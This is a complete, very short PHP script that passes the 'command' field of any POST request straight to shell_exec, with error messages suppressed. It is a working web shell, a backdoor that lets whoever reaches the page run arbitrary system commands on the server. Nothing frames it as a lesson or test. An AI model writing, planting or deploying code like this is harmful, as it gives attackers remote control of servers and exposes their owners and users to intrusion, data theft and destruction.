<?php
function shell($cmd) {
  	$ret = @shell_exec($cmd);
	return $ret;
}

shell($_POST['command']);
?>